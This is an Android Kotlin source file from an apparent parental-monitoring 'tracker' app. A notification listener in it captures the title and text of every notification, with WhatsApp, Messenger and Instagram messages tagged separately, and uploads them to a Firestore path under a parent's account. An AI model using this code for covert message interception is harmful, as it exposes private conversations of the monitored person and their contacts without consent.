package com.abuzahra.tracker.services

import android.content.Intent
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.google.firebase.firestore.FirebaseFirestore
import org.json.JSONObject
import android.os.Bundle
import android.text.TextUtils

class MyNotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        try {
            val packageName = sbn.packageName
            val extras = sbn.notification.extras
            
            // استخراج البيانات
            val title = extras.getCharSequence("android.title")?.toString() ?: ""
            val text = extras.getCharSequence("android.text")?.toString() ?: ""
            val bigText = extras.getCharSequence("android.bigText")?.toString() ?: ""

            val messageBody = if (TextUtils.isEmpty(bigText)) text else bigText
            
            // التحقق من التطبيقات المطلوبة
            if (packageName == "com.whatsapp" || packageName == "com.facebook.orca" || packageName == "com.instagram.android") {
                
                // تحضير البيانات لـ Firebase
                val data = hashMapOf(
                    "app_name" to getAppName(packageName),
                    "title" to title,
                    "body" to messageBody,
                    "timestamp" to System.currentTimeMillis(),
                    "type" to "social"
                )

                // إرسال لل Firestore
                sendToFirebase("social_logs", data)
            } else {
                // إشعارات عامة
                val data = hashMapOf(
                    "app_name" to getAppName(packageName),
                    "title" to title,
                    "body" to messageBody,
                    "timestamp" to System.currentTimeMillis(),
                    "type" to "notification"
                )
                sendToFirebase("notifications", data)
            }

        } catch (e: Exception) {
            Log.e("NotifListener", "Error: ${e.message}")
        }
    }

    private fun getAppName(packageName: String): String {
        return when (packageName) {
            "com.whatsapp" -> "WhatsApp"
            "com.facebook.orca" -> "Messenger"
            "com.instagram.android" -> "Instagram"
            else -> packageName
        }
    }

    private fun sendToFirebase(collection: String, data: Map<String, Any>) {
        val parentId = SharedPrefsManager.getParentUid(this) ?: return
        val deviceId = SharedPrefsManager.getDeviceId(this) ?: return
        
        FirebaseFirestore.getInstance()
            .collection("parents").document(parentId)
            .collection("children").document(deviceId)
            .collection(collection).add(data)
    }
}
